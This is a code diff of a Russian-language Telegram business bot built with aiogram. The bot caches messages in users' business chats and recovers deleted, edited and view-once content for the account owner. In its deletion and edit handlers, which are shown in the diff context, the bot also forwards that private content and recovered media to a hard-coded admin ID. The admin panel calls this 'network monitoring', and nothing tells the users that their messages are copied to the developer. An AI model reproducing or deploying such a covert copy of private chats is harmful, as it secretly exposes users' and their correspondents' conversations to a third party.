@@ -6,17 +6,23 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
 
+# ==========================================
+# ⚙️ ОСНОВНЫЕ НАСТРОЙКИ БОТА
+# ==========================================
 TOKEN = os.getenv('BOT_TOKEN') 
 ADMIN_ID = 1250562983  # ВАШ ID
 
+# ==========================================
+# 🖼 НАСТРОЙКИ ФОТОГРАФИЙ (Вставьте свои ссылки между кавычками)
+# ==========================================
+IMG_SETTINGS = "https://i.postimg.cc/nLtLjM5f/Gemini-Generated-Image-958e6h958e6h958e.jpg"
+IMG_EDITED   = "https://i.postimg.cc/J4frvGR1/Gemini-Generated-Image-d4yhcwd4yhcwd4yh.jpg"
+IMG_DELETED  = "https://i.postimg.cc/vmj3tFWK/e9c320fc-7cf5-43ec-b736-5354f04e46b2.jpg"
+IMG_VIEWONCE = "https://i.postimg.cc/vmj3tFWK/e9c320fc-7cf5-43ec-b736-5354f04e46b2.jpg" # Можно использовать ту же, что и для удаления
+
+
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
-
-# --- ТЕМАТИЧЕСКИЕ ИЗОБРАЖЕНИЯ (NFT / Telegram Gifts) ---
-IMG_SETTINGS = "https://i.imgur.com/K3yZ6vY.png"  # Картинка для меню настроек
-IMG_EDITED = "https://i.imgur.com/3q1Zc8s.png"    # Картинка для измененного текста
-IMG_DELETED = "https://i.imgur.com/9nFk9zZ.png"   # Картинка для удаленного текста
-IMG_VIEWONCE = "https://i.imgur.com/Z4w2u2z.png"  # Картинка для сгоревшего медиа
 
 # Оперативная память
 msg_cache = {}        
@@ -33,8 +39,15 @@ def get_user_info(user, compact=False):
     username = f"(@{user.username})" if user.username else ""
     return f"{name} {username} <code>[ID: {user.id}]</code>".replace("  ", " ")
 
-def get_owner(connection_id):
-    return connections_map.get(connection_id) or ADMIN_ID
+async def get_owner(connection_id, bot_instance: Bot):
+    if connection_id in connections_map:
+        return connections_map[connection_id]
+    try:
+        conn = await bot_instance.get_business_connection(connection_id)
+        connections_map[connection_id] = conn.user_chat_id
+        return conn.user_chat_id
+    except Exception:
+        return ADMIN_ID
 
 def get_settings(user_id):
     if user_id not in user_settings:
@@ -42,8 +55,8 @@ def get_settings(user_id):
             "deleted": True, 
             "edited": True, 
             "view_once": True,
-            "silent": False,    # Тихий режим (без звука)
-            "compact": False    # Компактные карточки
+            "silent": False,    
+            "compact": False    
         }
     return user_settings[user_id]
 
@@ -59,7 +72,6 @@ def settings_keyboard(user_id):
         ]
     ])
 
-# 1. АДМИН-ПАНЕЛЬ
 @dp.message(Command("admin"))
 async def admin_panel(message: Message):
     if message.from_user.id != ADMIN_ID: return
@@ -73,22 +85,19 @@ async def admin_panel(message: Message):
     text += "👁 <i>Мониторинг сети активен.</i>"
     await message.answer(text)
 
-# 2. МЕНЮ НАСТРОЕК С КАРТИНКОЙ
 @dp.message(Command("settings"))
 async def open_settings(message: Message):
     text = (
-        "🎛 <b>ПАНЕЛЬ УПРАВЛЕНИЯ NFT-ПЕРЕХВАТОМ</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
         "<i>Настройте алгоритмы под себя:</i>\n\n"
         "🔕 <b>Без звука:</b> Уведомления приходят тихо.\n"
         "📦 <b>Компакт:</b> Скрывает ID и лишние детали из логов."
     )
-    # Отправляем красивую картинку с меню
-    await message.answer_photo(
-        photo=IMG_SETTINGS, 
-        caption=text, 
-        reply_markup=settings_keyboard(message.from_user.id)
-    )
+    # Используем вашу картинку настроек
+    try:
+        await message.answer_photo(photo=IMG_SETTINGS, caption=text, reply_markup=settings_keyboard(message.from_user.id))
+    except Exception:
+        # Если ссылка неверная, отправит просто текст
+        await message.answer(text, reply_markup=settings_keyboard(message.from_user.id))
 
 @dp.callback_query(F.data.startswith("set_"))
 async def process_settings_callback(callback: CallbackQuery):
@@ -102,7 +111,6 @@ async def process_settings_callback(callback: CallbackQuery):
     status_text = "Активирован" if current_settings[setting_key] else "Деактивирован"
     await callback.answer(f"Модуль: {status_text}", show_alert=False)
 
-# 3. ИНСТРУКЦИЯ ПРИ СТАРТЕ
 @dp.message()
 async def private_messages(message: Message):
     users_db[message.from_user.id] = {
@@ -119,7 +127,6 @@ async def private_messages(message: Message):
     )
     await message.answer(instruction)
 
-# 4. СТАТУСЫ ПОДКЛЮЧЕНИЯ
 @dp.business_connection()
 async def b_connection(connection: BusinessConnection):
     if connection.is_enabled:
@@ -130,14 +137,14 @@ async def b_connection(connection: BusinessConnection):
                 photo=IMG_SETTINGS,
                 caption="💠 <b>АЛГОРИТМЫ ЗАПУЩЕНЫ</b>\n━━━━━━━━━━━━━━━━━━━━\nКанал перехвата установлен. Ожидаю активность.\n\n🎛 Управление: /settings"
             )
-        except Exception: pass
+        except Exception: 
+            await bot.send_message(connection.user_chat_id, "💠 <b>АЛГОРИТМЫ ЗАПУЩЕНЫ</b>\nОжидаю активность. Управление: /settings")
     else:
         connections_map.pop(connection.id, None)
         try:
             await bot.send_message(connection.user_chat_id, "🔌 <b>СВЯЗЬ РАЗОРВАНА</b>\nБот отключен от бизнес-аккаунта.")
         except Exception: pass
 
-# --- ФУНКЦИИ ОТПРАВКИ МЕДИА ---
 async def send_alert_with_image(target_id, text, img_url, silent=False):
     try:
         await bot.send_photo(target_id, photo=img_url, caption=text, disable_notification=silent)
@@ -159,10 +166,9 @@ async def send_recovered_media(target_id, alert_text, m_type, m_id, silent=False
     except Exception:
         await bot.send_message(target_id, alert_text + "\n<i>(Файл поврежден)</i>", disable_notification=silent)
 
-# 5. КЭШИРОВАНИЕ И ОДНОРАЗОВЫЕ
 @dp.business_message()
 async def handle_messages(message: Message):
-    owner_id = get_owner(message.business_connection_id)
+    owner_id = await get_owner(message.business_connection_id, bot)
     settings = get_settings(owner_id)
     
     author_info_full = get_user_info(message.from_user, compact=False)
@@ -200,10 +206,9 @@ async def handle_messages(message: Message):
                 alert = f"🎁 <b>ОДНОРАЗОВЫЙ ПОДАРОК СГОРЕЛ</b>\n━━━━━━━━━━━━━━━━━━━━\nОт: <b>{reply_author}</b>\n\n⚠️ <i>Система зафиксировала попытку отправки NFT-медиа с таймером. Файл заблокирован сервером.</i>"
                 await send_alert_with_image(owner_id, alert, IMG_VIEWONCE, settings["silent"])
 
-# 6. ИЗМЕНЕНИЯ
 @dp.edited_business_message()
 async def catch_edited(message: Message):
-    owner_id = get_owner(message.business_connection_id)
+    owner_id = await get_owner(message.business_connection_id, bot)
     settings = get_settings(owner_id)
     if not settings["edited"]: return
 
@@ -225,10 +230,9 @@ async def catch_edited(message: Message):
         await send_alert_with_image(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", IMG_EDITED, settings["silent"])
     msg_cache[cache_key]["text"] = new_display
 
-# 7. УДАЛЕНИЯ
 @dp.deleted_business_messages()
 async def catch_deleted(deleted: BusinessMessagesDeleted):
-    owner_id = get_owner(deleted.business_connection_id)
+    owner_id = await get_owner(deleted.business_connection_id, bot)
     settings = get_settings(owner_id)
     if not settings["deleted"]: return
 
@@ -244,7 +248,6 @@ async def catch_deleted(deleted: BusinessMessagesDeleted):
             else:
                 alert_text = f"💎 <b>УДАЛЕННЫЙ АССЕТ</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Ликвидатор:</b> {author}\n⏱ <b>Таймкод:</b> {data['date']}\n\n📦 <b>Содержимое:</b>\n{data['text']}"
             
-            # Если было медиа - шлем сам файл, если это был просто текст - шлем красивую NFT-заглушку
             if data.get('media_id'):
                 await send_recovered_media(owner_id, alert_text, data['media_type'], data['media_id'], settings["silent"])
                 if owner_id != ADMIN_ID:
@@ -255,7 +258,7 @@ async def catch_deleted(deleted: BusinessMessagesDeleted):
                     await send_alert_with_image(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", IMG_DELETED, settings["silent"])
 
 async def main():
-    print("Бот с графическим NFT-интерфейсом запущен.")
+    print("Бот запущен. Жду настройки изображений.")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
